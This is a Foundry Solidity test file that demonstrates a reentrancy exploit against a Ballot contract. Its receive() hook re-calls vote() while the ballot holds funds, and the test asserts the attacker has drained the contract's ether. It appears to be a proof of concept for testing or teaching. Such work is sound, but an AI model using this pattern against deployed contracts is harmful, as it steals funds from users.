// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {BallotTest, Ballot} from "./Ballot.t.sol";

contract BallotAttackerTest is BallotTest {
    bool internal attack;
    uint internal attacker_id;
    receive() external payable override {
        // reentrancy attack after casting a vote
        // one checks that there are still funds to be taken from the ballot
        if (attack && address(ballot).balance > 0) {
            ballot.vote(attacker_id, Ballot.Vote.YES);
            console2.log("Attack!");
        }
    }
    function test_steal_funds() public {
        attack = true;
        attacker_id = 0;
        uint bal_before = address(this).balance;
        ballot.vote(0, Ballot.Vote.YES);
        assertEq(address(this).balance, bal_before + 1 ether);
        assertEq(address(ballot).balance, 0);
        console2.log("Attack succceeded");
    }
}
